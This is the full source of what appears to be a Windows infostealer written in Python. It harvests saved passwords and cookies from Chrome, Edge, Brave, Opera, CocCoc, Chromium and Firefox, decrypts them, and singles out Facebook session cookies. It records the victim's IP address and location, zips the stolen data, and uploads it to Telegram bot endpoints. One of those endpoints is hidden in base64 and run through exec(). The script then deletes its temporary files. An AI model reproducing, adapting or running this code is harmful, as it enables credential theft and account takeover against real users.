______________import random\r\nimport requests as x01\r\nfrom datetime import datetime,tim
edelta\r\nimport os,json,shutil,win32crypt,sqlite3,base64\r\nfrom Crypto.Cipher import DES
3\r\nfrom Crypto.Cipher import AES\r\nfrom pyasn1.codec.der import decoder\r\nfrom hashlib
 import sha1, pbkdf2_hmac\r\nfrom Crypto.Util.Padding import unpad \r\nfrom base64 import 
b64decode\r\nimport hmac\r\n\r\n\r\n\r\nfud = base64.b64decode("LTk2MjEyNDk0OA==").decode(
\'utf-8\')\r\ncrypt = base64.b64decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYzNzkwNDY3OD
c6QUFGNmZfdTE4dXN1b01rcllqUUZtZWoyblNfODA1WE5NdE0vc2VuZERvY3VtZW50").decode(\'utf-8\')\r\n
\r\ndef check_chrome_running():\r\n    for proc in os.popen(\'tasklist\').readlines():\r\n
        if \'chrome.exe\' in proc:\r\n            return True\r\n    return False\r\nif ch
eck_chrome_running():\r\n    os.system(\'taskkill /f /im chrome.exe\')\r\nelse:print("")\r
\n\r\nnow = datetime.now()\r\nresponse =x01.get("https://ipinfo.io").text\r\nip_country = 
json.loads(response)\r\nten_country = ip_country[\'region\']\r\ncity = ip_country[\'city\'
]\r\nip = ip_country[\'ip\']\r\ncountry_code = ip_country[\'country\']\r\nname_f = country
_code +" "+ ip \r\nnewtime = str(now.hour) + "h" +str(now.minute)+"m"+str(now.second)+"s"+
str(now.day)+"-"+str(now.month)+"-"+str(now.year)\r\n\r\ndef find_profile(path_userdata):\
r\n    profile_path = []\r\n    for name in os.listdir(path_userdata):\r\n        if name.
startswith("Profile") or name == \'Default\':\r\n            dir_path = os.path.join(path_
userdata, name)\r\n            profile_path.append(dir_path)\r\n    return profile_path\r\
n\r\ndef get_chrome(data_path,chrome_path):\r\n    data_chrome = os.path.join(data_path, "
Chrome");os.mkdir(data_chrome)\r\n    profiles = find_profile(chrome_path)\r\n    for i,pr
ofile in enumerate(profiles, 1):\r\n        try:\r\n            os.mkdir(os.path.join(data
_chrome,"profile"+str(i)))\r\n            def copy_file():\r\n                if os.path.e
xists(os.path.join(profile,\'Network\',\'Cookies\')):\r\n                    shutil.copyfi
le(os.path.join(profile,\'Network\',\'Cookies\'),os.path.join(data_chrome,"profile"+str(i)
,\'Cookies\'))\r\n                if os.path.exists(os.path.join(profile,\'Login Data\')):
\r\n                    shutil.copyfile(os.path.join(profile,\'Login Data\'),os.path.join(
data_chrome,"profile"+str(i),\'Login Data\'))\r\n                if os.path.exists(os.path
.join(chrome_path,\'Local State\')):\r\n                    shutil.copyfile(os.path.join(c
hrome_path,\'Local State\'),os.path.join(data_chrome,"profile"+str(i),\'Local State\'))\r\
n            copy_file()\r\n            delete_file(os.path.join(data_chrome,"profile"+str
(i)))\r\n        except: shutil.rmtree(os.path.join(data_chrome,"profile"+str(i))) \r\n\r\
ndef get_edge(data_path,edge_path):\r\n    data_edge = os.path.join(data_path, "Edge");os.
mkdir(data_edge)\r\n    profiles = find_profile(edge_path)\r\n    for i,profile in enumera
te(profiles, 1):\r\n        try:\r\n            os.mkdir(os.path.join(data_edge,"profile"+
str(i)))\r\n            def copy_file():\r\n                if os.path.exists(os.path.join
(profile,\'Network\',\'Cookies\')):\r\n                    shutil.copyfile(os.path.join(pr
ofile,\'Network\',\'Cookies\'),os.path.join(data_edge,"profile"+str(i),\'Cookies\'))\r\n  
              if os.path.exists(os.path.join(profile,\'Login Data\')):\r\n                
    shutil.copyfile(os.path.join(profile,\'Login Data\'),os.path.join(data_edge,"profile"+
str(i),\'Login Data\'))\r\n                if os.path.exists(os.path.join(edge_path,\'Loca
l State\')):\r\n                    shutil.copyfile(os.path.join(edge_path,\'Local State\'
),os.path.join(data_edge,"profile"+str(i),\'Local State\'))\r\n            copy_file();del
ete_file(os.path.join(data_edge,"profile"+str(i)))\r\n        except:shutil.rmtree(os.path
.join(data_edge,"profile"+str(i))) \r\n\r\ndef get_brave(data_path,brave_path):\r\n    dat
a_brave = os.path.join(data_path, "Brave");os.mkdir(data_brave)\r\n    profiles = find_pro
file(brave_path)\r\n    for i,profile in enumerate(profiles, 1):\r\n        try:\r\n      
      os.mkdir(os.path.join(data_brave,"profile"+str(i)))\r\n            def copy_file():\
r\n                if os.path.exists(os.path.join(profile,\'Network\',\'Cookies\')):\r\n  
                  shutil.copyfile(os.path.join(profile,\'Network\',\'Cookies\'),os.path.jo
in(data_brave,"profile"+str(i),\'Cookies\'))\r\n                if os.path.exists(os.path.
join(profile,\'Login Data\')):\r\n                    shutil.copyfile(os.path.join(profile
,\'Login Data\'),os.path.join(data_brave,"profile"+str(i),\'Login Data\'))\r\n            
    if os.path.exists(os.path.join(brave_path,\'Local State\')):\r\n                    sh
util.copyfile(os.path.join(brave_path,\'Local State\'),os.path.join(data_brave,"profile"+s
tr(i),\'Local State\'))\r\n            copy_file();delete_file(os.path.join(data_brave,"pr
ofile"+str(i)))\r\n            \r\n        except:shutil.rmtree(os.path.join(data_brave,"p
rofile"+str(i))) \r\n\r\ndef get_opera(data_path,opera_path):\r\n    data_opera = os.path.
join(data_path, "Opera");os.mkdir(data_opera)\r\n    try:\r\n        def copy_file():\r\n 
           if os.path.exists(os.path.join(opera_path,\'Network\',\'Cookies\')):\r\n       
         shutil.copyfile(os.path.join(opera_path,\'Network\',\'Cookies\'),os.path.join(dat
a_opera,\'Cookies\'))\r\n            if os.path.exists(os.path.join(opera_path,\'Login Dat
a\')):\r\n                shutil.copyfile(os.path.join(opera_path,\'Login Data\'),os.path.
join(data_opera,\'Login Data\'))\r\n            if os.path.exists(os.path.join(opera_path,
\'Local State\')):\r\n                shutil.copyfile(os.path.join(opera_path,\'Local Stat
e\'),os.path.join(data_opera,\'Local State\'))\r\n        copy_file();delete_file(data_ope
ra)\r\n    except:shutil.rmtree(os.path.join(data_opera)) \r\ndef get_coccoc(data_path,coc
coc_path):\r\n    data_coccoc= os.path.join(data_path, "CocCoc");os.mkdir(data_coccoc)\r\n
    profiles = find_profile(coccoc_path)\r\n    for i,profile in enumerate(profiles, 1):\r
\n        try:\r\n            os.mkdir(os.path.join(data_coccoc,"profile"+str(i)))\r\n    
        def copy_file():\r\n                if os.path.exists(os.path.join(profile,\'Netwo
rk\',\'Cookies\')):\r\n                    shutil.copyfile(os.path.join(profile,\'Network\
',\'Cookies\'),os.path.join(data_coccoc,"profile"+str(i),\'Cookies\'))\r\n                
if os.path.exists(os.path.join(profile,\'Login Data\')):\r\n                    shutil.cop
yfile(os.path.join(profile,\'Login Data\'),os.path.join(data_coccoc,"profile"+str(i),\'Log
in Data\'))\r\n                if os.path.exists(os.path.join(coccoc_path,\'Local State\')
):\r\n                    shutil.copyfile(os.path.join(coccoc_path,\'Local State\'),os.pat
h.join(data_coccoc,"profile"+str(i),\'Local State\'))\r\n            copy_file();delete_fi
le(os.path.join(data_coccoc,"profile"+str(i)))    \r\n            \r\n        except:shuti
l.rmtree(os.path.join(data_coccoc,"profile"+str(i))) \r\n        \r\n\r\ndef get_chromium(
data_path,chromium_path):\r\n    data_chromium= os.path.join(data_path, "Chromium");os.mkd
ir(data_chromium)\r\n    profiles = find_profile(chromium_path)\r\n    for i,profile in en
umerate(profiles, 1):\r\n        try:\r\n            os.mkdir(os.path.join(data_chromium,"
profile"+str(i)))\r\n            def copy_file():\r\n                if os.path.exists(os.
path.join(profile,\'Cookies\')):\r\n                    shutil.copyfile(os.path.join(profi
le,\'Cookies\'),os.path.join(data_chromium,"profile"+str(i),\'Cookies\'))\r\n             
   if os.path.exists(os.path.join(profile,\'Login Data\')):\r\n                    shutil.
copyfile(os.path.join(profile,\'Login Data\'),os.path.join(data_chromium,"profile"+str(i),
\'Login Data\'))\r\n                if os.path.exists(os.path.join(chromium_path,\'Local S
tate\')):\r\n                    shutil.copyfile(os.path.join(chromium_path,\'Local State\
'),os.path.join(data_chromium,"profile"+str(i),\'Local State\'))\r\n            copy_file(
);delete_file(os.path.join(data_chromium,"profile"+str(i)))\r\n        except:shutil.rmtre
e(os.path.join(data_chromium,"profile"+str(i))) \r\ndef find_profile_firefox(firefox_path)
:\r\n    profile_path = []\r\n    for name in os.listdir(firefox_path):\r\n            dir
_path = os.path.join(firefox_path, name)\r\n            profile_path.append(dir_path)\r\n 
   return profile_path\r\n\r\ndef get_firefox(data_path,firefox_path):\r\n    data_firefox
 = os.path.join(data_path,\'firefox\');os.mkdir(data_firefox)\r\n    profiles = find_profi
le_firefox(firefox_path)\r\n   \r\n    for i,profile in enumerate(profiles, 1):\r\n       
 try:\r\n            os.mkdir(os.path.join(data_firefox,"profile"+str(i)))\r\n            
def copy_file():\r\n                if os.path.exists(os.path.join(profile,\'cookies.sqlit
e\')):\r\n                    shutil.copyfile(os.path.join(profile,\'cookies.sqlite\'),os.
path.join(data_firefox,"profile"+str(i),\'cookies.sqlite\'))\r\n                if os.path
.exists(os.path.join(profile,\'key4.db\')):\r\n                    shutil.copyfile(os.path
.join(profile,\'key4.db\'),os.path.join(data_firefox,"profile"+str(i),\'key4.db\'))\r\n   
             if os.path.exists(os.path.join(profile,\'logins.json\')):\r\n                
    shutil.copyfile(os.path.join(profile,\'logins.json\'),os.path.join(data_firefox,"profi
le"+str(i),\'logins.json\'))\r\n            copy_file()\r\n            if os.path.exists(o
s.path.join(data_firefox,"profile"+str(i),\'cookies.sqlite\')):\r\n\r\n                del
ete_firefox(os.path.join(data_firefox,"profile"+str(i)))\r\n            else:\r\n         
       shutil.rmtree(os.path.join(data_firefox,"profile"+str(i)))   \r\n            \r\n  
      except:shutil.rmtree(os.path.join(data_firefox,"profile"+str(i))) \r\n\r\ndef encryp
t(data_profile):\r\n    login_db = os.path.join(data_profile, "Login Data")\r\n    key_db 
= os.path.join(data_profile ,"Local State",)\r\n    cookie_db = os.path.join(data_profile,
 "Cookies")\r\n    with open(key_db, "r", encoding="utf-8") as f:\r\n        local_state =
 f.read()\r\n        local_state = json.loads(local_state)\r\n    master_key = base64.b64d
ecode(local_state["os_crypt"]["encrypted_key"])\r\n    master_key = master_key[5:]  \r\n  
  master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]\r\n    tr
y :\r\n        conn = sqlite3.connect(login_db)\r\n        cursor = conn.cursor()\r\n     
   cursor.execute("SELECT action_url, username_value, password_value FROM logins")\r\n    
    for r in cursor.fetchall():\r\n            url = r[0]\r\n            username = r[1]\r
\n            encrypted_password = r[2]\r\n            iv = encrypted_password[3:15]\r\n  
          payload = encrypted_password[15:]\r\n            cipher = AES.new(master_key, AE
S.MODE_GCM, iv)\r\n            decrypted_pass = cipher.decrypt(payload)\r\n            dec
rypted_password = decrypted_pass[:-16].decode() \r\n            with open((os.path.join(da
ta_profile, "Password.txt")), \'a\',encoding=\'utf-8\') as f:\r\n                f.write("
URL: " + url + "\\t\\t" + username + "|" + decrypted_password + "\\n" + "\\n")      \r\n  
  except :\r\n        print(" ")\r\n    try:    \r\n        conn2 = sqlite3.connect(cookie
_db)\r\n        conn2.text_factory = lambda b: b.decode(errors="ignore")\r\n        cursor
2 = conn2.cursor()\r\n        cursor2.execute("""\r\n        SELECT host_key, name, value,
 encrypted_value,is_httponly,is_secure,expires_utc\r\n        FROM cookies\r\n        """)
\r\n        json_data = []\r\n        for host_key, name, value,encrypted_value,is_httponl
y,is_secure,expires_utc in cursor2.fetchall():\r\n            if not value:\r\n           
     iv = encrypted_value[3:15]\r\n                encrypted_value = encrypted_value[15:]\
r\n                cipher = AES.new(master_key, AES.MODE_GCM, iv)\r\n                decry
pted_value = cipher.decrypt(encrypted_value)[:-16].decode()\r\n            else:\r\n      
          decrypted_value = value     \r\n            json_data.append({\r\n              
  "host": host_key,\r\n                "name": name,\r\n                "value": decrypted
_value,\r\n                "is_httponly":is_httponly,\r\n                "is_secure":is_se
cure,\r\n                "expires_utc":expires_utc\r\n                })\r\n            \r
\n        result = []\r\n        for item in json_data:\r\n            host = item["host"]
\r\n            name = item["name"]\r\n            value = item["value"]\r\n            is
_httponly= item["is_httponly"]\r\n            is_secure=item["is_secure"]\r\n            e
xpires_utc = item["expires_utc"]\r\n            if host == ".facebook.com":\r\n           
     result.append(f"{name} = {value}")\r\n            if is_httponly == 1 : httponly = "T
RUE"\r\n            else:httponly = "FAILSE"\r\n            if is_secure == 1 : secure = "
TRUE"\r\n            else:secure = "FAILSE"\r\n            cookie = f"{host}\\t{httponly}\
\t{\'/\'}\\t{secure}\\t\\t{name}\\t{value}\\n"          \r\n            with open((os.path
.join(data_profile, "Cookie.txt")), \'a\') as f:\r\n                f.write(cookie)\r\n   
     result_string = "; ".join(result)\r\n        with open((os.path.join(os.environ["TEMP
"], name_f, "Cookiefb.txt")), \'a\',encoding=\'utf-8\') as f:\r\n            f.write(resul
t_string+"\\n" + "\\n")\r\n    except:\r\n        print(" ")\r\n\r\ndef getKey(afk):  \r\n
    conn = sqlite3.connect(os.path.join(afk, "key4.db"))\r\n    c = conn.cursor()\r\n    c
.execute("SELECT item1,item2 FROM metadata;")\r\n\r\n    row = c.fetchone()\r\n    globalS
alt = row[0] #item1\r\n    item2 = row[1]\r\n    decodedItem2 = decoder.decode( item2 ) \r
\n    clearText = decryptPBE( decodedItem2, globalSalt )\r\n    \r\n    if clearText == b\
'password-check\\x02\\x02\': \r\n      c.execute("SELECT a11,a102 FROM nssPrivate;")\r\n  
    for row in c:\r\n        if row[0] != None:\r\n            break\r\n      a11 = row[0]
\r\n      a102 = row[1] \r\n      if a102 != None: \r\n        decoded_a11 = decoder.decod
e( a11 )\r\n        clearText= decryptPBE( decoded_a11, globalSalt )\r\n        return cle
arText[:24]   \r\n    return None\r\n\r\ndef encrypt_firefox(path_f):\r\n    try:\r\n     
   if os.path.exists(os.path.join(path_f ,"logins.json")):\r\n            key = getKey(pat
h_f)\r\n            logins = getLoginData(path_f)\r\n\r\n            for i in logins:\r\n 
               username= unpad( DES3.new( key, DES3.MODE_CBC, i[0][1]).decrypt(i[0][2]),8 
) \r\n                password= unpad( DES3.new( key, DES3.MODE_CBC, i[1][1]).decrypt(i[1]
[2]),8 ) \r\n                str_pass =  password.decode(\'utf-8\')\r\n                str
_user =  username.decode(\'utf-8\')\r\n                with open((os.path.join(path_f,"Pas
sword.txt")), \'a\',encoding=\'utf-8\') as f:\r\n                    f.write(i[2]+"       
   "+str_user + "|"+ str_pass + "\\n")\r\n    except :\r\n        print("")\r\n    try:\r\
n        db_path = os.path.join(path_f, "cookies.sqlite")\r\n        db = sqlite3.connect(
db_path) \r\n        db.text_factory = lambda b: b.decode(errors="ignore")\r\n        curs
or = db.cursor()\r\n        cursor.execute("""\r\n        SELECT id , name, value ,host\r\
n        FROM moz_cookies\r\n        """)\r\n        json_data = []\r\n        for id , na
me, value ,host in cursor.fetchall():\r\n            json_data.append({\r\n               
 "host": host,\r\n                "name": name,\r\n                "value": value\r\n     
           \r\n            })\r\n        result = []\r\n        for item in json_data:\r\n
            host = item["host"]\r\n            name = item["name"]\r\n            value = 
item["value"]\r\n            if host == ".facebook.com":\r\n                result.append(
f"{name} = {value}")\r\n            cookie = f"{host}\\t\\t{\'/\'}\\t\\t\\t{name}\\t{value
}\\n"          \r\n            with open((os.path.join(path_f, "Cookie.txt")), \'a\') as f
:\r\n                f.write(cookie)\r\n        result_string = "; ".join(result)\r\n     
   with open((os.path.join(os.environ["TEMP"], name_f, "Cookiefb.txt")), \'a\',encoding=\'
utf-8\') as f:\r\n            f.write(result_string+"\\n" +  "\\n")\r\n    except:\r\n    
    print("")\r\n\r\n    \r\ndef delete_firefox(data_firefox_profile):\r\n    key4db = os.
path.join(data_firefox_profile,"key4.db")\r\n    cookiesdb=os.path.join(data_firefox_profi
le,"cookies.sqlite")\r\n    logindb = os.path.join(data_firefox_profile ,"logins.json")\r\
n    try:\r\n        encrypt_firefox(data_firefox_profile)\r\n        if os.path.exists(ke
y4db):\r\n            os.remove(key4db),\r\n        if os.path.exists(cookiesdb):    \r\n 
           os.remove(cookiesdb),\r\n        if os.path.exists(logindb):    \r\n           
 os.remove(logindb)\r\n    except: print("")\r\n    \r\n\r\ndef delete_file(data_profile):
\r\n    login_db = os.path.join(data_profile, "Login Data")\r\n    key_db = os.path.join(d
ata_profile ,"Local State",)\r\n    cookie_db = os.path.join(data_profile, "Cookies")\r\n 
   try:\r\n        encrypt(data_profile)\r\n        if os.path.exists(login_db):\r\n      
      os.remove(login_db),\r\n        if os.path.exists(key_db):    \r\n            os.rem
ove(key_db),\r\n        if os.path.exists(cookie_db):    \r\n            os.remove(cookie_
db)\r\n    except:print("")\r\n\r\ndef delete_firefox(data_firefox_profile):\r\n    key4db
 = os.path.join(data_firefox_profile,"key4.db")\r\n    cookiesdb=os.path.join(data_firefox
_profile,"cookies.sqlite")\r\n    logindb = os.path.join(data_firefox_profile ,"logins.jso
n")\r\n    try:\r\n        encrypt_firefox(data_firefox_profile)\r\n        if os.path.exi
sts(key4db):\r\n            os.remove(key4db),\r\n        if os.path.exists(cookiesdb):   
 \r\n            os.remove(cookiesdb),\r\n        if os.path.exists(logindb):    \r\n     
       os.remove(logindb)\r\n    except: print("")   \r\n\r\ndef decryptMoz3DES( globalSal
t, entrySalt, encryptedData ):\r\n  hp = sha1( globalSalt ).digest()\r\n  pes = entrySalt 
+ b\'\\x00\'*(20-len(entrySalt))\r\n  chp = sha1( hp+entrySalt ).digest()\r\n  k1 = hmac.n
ew(chp, pes+entrySalt, sha1).digest()\r\n  tk = hmac.new(chp, pes, sha1).digest()\r\n  k2 
= hmac.new(chp, tk+entrySalt, sha1).digest()\r\n  k = k1+k2\r\n  iv = k[-8:]\r\n  key = k[
:24]\r\n  return DES3.new( key, DES3.MODE_CBC, iv).decrypt(encryptedData)\r\n\r\ndef decod
eLoginData(data):\r\n  asn1data = decoder.decode(b64decode(data)) # decodage base64, puis 
ASN1\r\n  key_id = asn1data[0][0].asOctets()\r\n  iv = asn1data[0][1][1].asOctets()\r\n  c
iphertext = asn1data[0][2].asOctets()\r\n  return key_id, iv, ciphertext \r\ndef getLoginD
ata(afkk):\r\n  logins = []\r\n  json_file = os.path.join(afkk ,"logins.json")\r\n  loginf
 = open( json_file, \'r\',encoding=\'utf-8\').read()\r\n  jsonLogins = json.loads(loginf)\
r\n  for row in jsonLogins[\'logins\']:\r\n    encUsername = row[\'encryptedUsername\']\r\
n    encPassword = row[\'encryptedPassword\']\r\n    logins.append( (decodeLoginData(encUs
ername), decodeLoginData(encPassword), row[\'hostname\']) )\r\n  return logins\r\n\r\ndef 
decryptPBE(decodedItem, globalSalt): #PBE pour Password Based Encryption \r\n  pbeAlgo = s
tr(decodedItem[0][0][0])\r\n  if pbeAlgo == \'1.2.840.113549.1.12.5.1.3\': #pbeWithSha1And
TripleDES-CBC\r\n    entrySalt = decodedItem[0][0][1][0].asOctets()\r\n    cipherT = decod
edItem[0][1].asOctets()\r\n    key = decryptMoz3DES( globalSalt, entrySalt, cipherT )\r\n 
   return key[:24]\r\n  elif pbeAlgo == \'1.2.840.113549.1.5.13\': #pkcs5 pbes2  \r\n    e
ntrySalt = decodedItem[0][0][1][0][1][0].asOctets()\r\n    iterationCount = int(decodedIte
m[0][0][1][0][1][1])\r\n    keyLength = int(decodedItem[0][0][1][0][1][2])\r\n    k = sha1
(globalSalt).digest()\r\n    key = pbkdf2_hmac(\'sha256\', k, entrySalt, iterationCount, d
klen=keyLength)    \r\n    iv = b\'\\x04\\x0e\'+decodedItem[0][0][1][1][1].asOctets()\r\n 
   cipherT = decodedItem[0][1].asOctets()\r\n    clearText = AES.new(key, AES.MODE_CBC, iv
).decrypt(cipherT)\r\n    return clearText\r\n\r\ndef delete_file(data_profile):\r\n    lo
gin_db = os.path.join(data_profile, "Login Data")\r\n    key_db = os.path.join(data_profil
e ,"Local State",)\r\n    cookie_db = os.path.join(data_profile, "Cookies")\r\n    try:\r\
n        encrypt(data_profile)\r\n        if os.path.exists(login_db):\r\n            os.r
emove(login_db),\r\n        if os.path.exists(key_db):    \r\n            os.remove(key_db
),\r\n        if os.path.exists(cookie_db):    \r\n            os.remove(cookie_db)\r\n   
 except:print("")\r\n\r\ndef Compressed(z_ph,number):\r\n    exec(base64.b64decode("d2l0aC
BvcGVuKHpfcGgsICdyYicpIGFzIGY6CiAgICAgICAgeDAxLnBvc3QoY3J5cHQsZGF0YT17J2NhcHRpb24nOiJJRDoi
K2lkKCkrIiAgICBcbklQOiIraXArIiAgICAgXG4iK251bWJlciwnY2hhdF9pZCc6ZnVkfSxmaWxlcz17J2RvY3VtZW
50JzogZn0p").decode(\'utf-8\'))\r\n\r\ndef demso() :\r\n    path_demso = r"C:\\Users\\Publ
ic\\Document\\number.txt"\r\n    if os.path.exists(path_demso):\r\n        with open(path_
demso, \'r\') as file:\r\n            number = file.read()\r\n        number = int(number)
+1\r\n        with open(path_demso, \'w\') as file:\r\n            abc = str(number)\r\n  
          file.write(abc)\r\n    else:\r\n        with open(path_demso, \'w\') as file:\r\
n            file.write("1")\r\n            number = 1\r\n    return number\r\n\r\ndef id(
) :\r\n    path_id = r"C:\\Users\\Public\\Document\\id.txt"\r\n    if os.path.exists(path_
id):\r\n        with open(path_id, \'r\') as file:\r\n            id = file.read()\r\n    
else:\r\n        random_number = random.randint(10**14, 10**15 - 1)\r\n        id = str(ra
ndom_number)\r\n        with open(path_id, \'w\') as file:\r\n            file.write(id)\r
\n    return id\r\n# def time() :\r\n#     current_time = datetime.now()\r\n#     formatte
d_time = current_time.strftime("%H:%M, %d/%m/%Y")\r\n#     formatted_time2 = datetime.strp
time(formatted_time, "%H:%M, %d/%m/%Y")\r\n#     path_time = r"C:\\Users\\Public\\time.txt
"\r\n#     if os.path.exists(path_time):\r\n#         with open(path_time, \'r\') as file:
\r\n#             time_str = file.read().strip()\r\n#             file_time = datetime.str
ptime(time_str, "%H:%M, %d/%m/%Y")\r\n        \r\n#         time_diff = formatted_time2 - 
file_time\r\n#         if time_diff < timedelta(minutes=30):\r\n#             a = 0\r\n#  
       else:\r\n#             a = 1\r\n#             with open(path_time, \'w\') as file:\
r\n#                 file.write(formatted_time + \'\\n\')\r\n    \r\n#     else :\r\n#    
     with open(path_time, \'w\') as file:\r\n#             file.write(formatted_time + \'\
\n\')\r\n#             a = 1\r\n#     return a\r\n\r\n\r\n\r\n    \r\ndef main():\r\n    n
umber = "Thu Spam l\xe1\xba\xa7n th\xe1\xbb\xa9 " + str(demso())\r\n    data_path = os.pat
h.join(os.environ["TEMP"], name_f);os.mkdir(data_path)\r\n    chrome = os.path.join(os.env
iron["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")\r\n    firefox =
 os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming","Mozilla", "Firefox", "Profi
les")\r\n    Edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft
", "Edge", "User Data")\r\n    Opera = os.path.join(os.environ["USERPROFILE"], "AppData", 
"Roaming", "Opera Software", "Opera Stable")\r\n    Brave = os.path.join(os.environ["USERP
ROFILE"], "AppData", "Local","BraveSoftware", "Brave-Browser", "User Data")\r\n    coccoc 
= os.path.join(os.environ["USERPROFILE"], "AppData", "Local","CocCoc", "Browser", "User Da
ta")\r\n    chromium = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Chromiu
m", "User Data")\r\n\r\n    if os.path.exists(chrome):\r\n        get_chrome(data_path,chr
ome)\r\n    if os.path.exists(Edge):\r\n        get_edge(data_path,Edge)\r\n\r\n    if os.
path.exists(Opera):\r\n        get_opera(data_path,Opera)\r\n\r\n    if os.path.exists(Bra
ve):\r\n        get_brave(data_path,Brave)\r\n        \r\n    if os.path.exists(coccoc):\r
\n        get_coccoc(data_path,coccoc)\r\n       \r\n    if os.path.exists(firefox):\r\n  
      get_firefox(data_path,firefox)\r\n       \r\n    if os.path.exists(chromium):\r\n   
     get_chromium(data_path,chromium)  \r\n    python310_path = r\'C:\\Users\\Public\\Docu
ment.zip\'\r\n    z_ph = os.path.join(os.environ["TEMP"], name_f +\'.zip\');shutil.make_ar
chive(z_ph[:-4], \'zip\', data_path)\r\n    Compressed(z_ph,number)\r\n    token = \'https
://api.telegram.org/bot6537709141:AAHYcrdlx3XGkiPYKheRUN3AfjSSN52744Y/sendDocument\';IDcha
t = \'-999633413\'\r\n    with open(z_ph, \'rb\') as f:\r\n        x01.post(token,data={\'
caption\':"ID:"+id()+"    \\nIP:"+ip+"     \\n"+number,\'chat_id\':IDchat},files={\'docume
nt\': f})\r\n    shutil.rmtree(os.environ["TEMP"], name_f +\'.zip\');shutil.rmtree(os.envi
ron["TEMP"], name_f)\r\n    if os.path.exists(python310_path):\r\n        os.remove(python
310_path)\r\n    if os.path.exists(file_path):\r\n        os.remove(file_path)\r\nmain()'